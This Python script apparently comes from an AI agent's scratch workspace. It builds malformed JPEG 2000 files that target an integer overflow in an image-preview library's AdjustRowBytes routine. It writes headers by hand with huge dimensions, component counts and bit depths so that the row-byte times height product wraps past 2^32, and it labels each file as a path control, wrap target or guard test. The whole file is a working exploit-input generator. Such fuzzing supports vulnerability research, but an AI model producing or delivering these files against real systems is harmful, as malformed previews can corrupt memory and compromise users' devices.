#!/usr/bin/env python3
# gen_jp2_v2.py -- JP2 set that FORCES c != d (rowbytes mismatch) so
# ImageIOPixelConverter::AdjustRowBytes is actually called, and targets the
# d*b 32-bit wrap. Destination (preview) is typically RGB 8-bit, so any
# non-RGB-8bit source => srcRowBytes != dstRowBytes => AdjustRowBytes runs.
import os, struct, sys
from PIL import Image

OUT = sys.argv[1] if len(sys.argv) > 1 else "/home/box/.hermes/profiles/seraphine/cache/scratch/jp2s2"
os.makedirs(OUT, exist_ok=True)

def box(t, p): return struct.pack(">I", 8 + len(p)) + t + p

def build_j2k(X, Y, C, prec, signed=False):
    comps = b"".join(bytes([((prec-1)|(0x80 if signed else 0)), 1, 1]) for _ in range(C))
    siz = b"\xFF\x51" + struct.pack(">HHIIIIIIIIH", 38+3*C, 0, X, Y, 0, 0, X, Y, 0, 0, C) + comps
    cod = b"\xFF\x52" + struct.pack(">H", 12) + bytes([0]) + struct.pack(">BHB", 0, 1, 0) + bytes([0,4,4,0,1])
    qcd = b"\xFF\x5C" + struct.pack(">H", 4) + bytes([0x20, 0x08])
    sot = b"\xFF\x90" + struct.pack(">H", 10) + struct.pack(">H", 0) + struct.pack(">I", 14+C) + bytes([0, 1])
    sod = b"\xFF\x93" + (b"\x00" * C)
    return b"\xFF\x4F" + siz + cod + qcd + sot + sod + b"\xFF\xD9"

def build_jp2(X, Y, C, prec, signed=False):
    sig = bytes.fromhex("0000000C6A5020200D0A870A")
    ftyp = box(b"ftyp", b"jp2 " + struct.pack(">I",0) + b"jp2 ")
    bpc = (prec-1) | (0x80 if signed else 0)
    ihdr = box(b"ihdr", struct.pack(">IIHBBBB", Y, X, C, bpc, 7, 0, 0))
    colr = box(b"colr", bytes([1,0,0]) + struct.pack(">I", 16 if C>=3 else 17))
    jp2c = box(b"jp2c", build_j2k(X, Y, C, prec, signed))
    return sig + ftyp + box(b"jp2h", ihdr+colr) + jp2c

def bps(p): return (p+7)//8

# (name, X, Y, C, prec, signed)
# GOAL: force c != d (non-RGB-8bit) AND target d*b wrap (many-comp => large rowbytes).
T = [
  # ---- reach AdjustRowBytes, NO wrap (path controls: non-RGB, small) ----
  ("r_gray256_c1_p8",     256, 256, 1, 8, False),    # gray -> RGB : c!=d, small
  ("r_cmyk256_c4_p8",     256, 256, 4, 8, False),    # CMYK -> RGB : c!=d
  ("r_16bit256_c3_p16",   256, 256, 3, 16, False),   # 16-bit -> 8-bit : c!=d
  ("r_gray1024_c1_p8",   1024,1024, 1, 8, False),
  ("r_c8_512_p8",         512, 512, 8, 8, False),    # 8-comp
  ("r_p32_128_c3",        128, 128, 3, 32, False),   # 32-bit
  # ---- WRAP targets: many-comp => large srcRowBytes; d*b = X*C*bps*Y >= 2^32 ----
  ("w8192h8192_c64_p8",   8192, 8192, 64, 8, False),   # rowbytes=524288, prod=2^32 (wraps to 0)
  ("w16384h4096_c64_p8", 16384, 4096, 64, 8, False),   # prod=2^32
  ("w4096h4096_c256_p8",  4096, 4096, 256, 8, False),  # prod=2^32
  ("w2048h2048_c1024_p8", 2048, 2048, 1024, 8, False), # prod=2^32
  ("w1024h1024_c4096_p8", 1024, 1024, 4096, 8, False), # prod=2^32
  ("w8193h8192_c64_p8",   8193, 8192, 64, 8, False),   # prod=2^32+524288 (wrap, small residue)
  ("w4097h4096_c256_p8",  4097, 4096, 256, 8, False),
  ("w2049h2048_c1024_p8", 2049, 2048, 1024, 8, False),
  ("w8192h8192_c64_p16",  8192, 8192, 64, 16, False),  # 16-bit many-comp
  ("w4096h4096_c128_p16", 4096, 4096, 128, 16, False),
  ("w2048h4096_c512_p16", 2048, 4096, 512, 16, False),
  # ---- few-comp HUGE dims (d=dstRowBytes interpretation: 3*X*Y wrap) ----
  ("d_gray65536_c1_p8",   65536, 65536, 1, 8, False),  # dstRow=3*65536, *65536 ~ 12.9G (wrap) ; px=4.3G
  ("d_gray32768x65536_c1",32768, 65536, 1, 8, False),  # px=2.1G
  ("d_rgb65536_c3_p8",    65536, 65536, 3, 8, False),
  # ---- guard mapping (large px, no wrap) ----
  ("g16384h16384_c1_p8",  16384, 16384, 1, 8, False),  # px=268M
  ("g8192h8192_c1_p8",    8192, 8192, 1, 8, False),    # px=67M
  ("g16384h16384_c4_p8",  16384, 16384, 4, 8, False),
  # ---- signed variants ----
  ("s8192h8192_c64_p8",   8192, 8192, 64, 8, True),
  ("s4096h4096_c256_p8",  4096, 4096, 256, 8, True),
]
made=0
for (n,X,Y,C,prec,sg) in T:
    d=build_jp2(X,Y,C,prec,sg)
    open(os.path.join(OUT,n+".jp2"),"wb").write(d)
    rb=X*C*bps(prec); prod=rb*Y
    print(f"{n:22s} {X}x{Y} c{C} p{prec}{'s' if sg else ''} rowbytes={rb} prod={prod} ({'WRAP' if prod>=2**32 else 'no-wrap'}) {len(d)}B")
    made+=1
# PIL valid non-RGB control (gray -> forces c!=d)
Image.new('L',(256,256),128).save(os.path.join(OUT,"pil_gray256.jp2"), format="JPEG2000")
print(f"\n{made+1} files -> {OUT}")
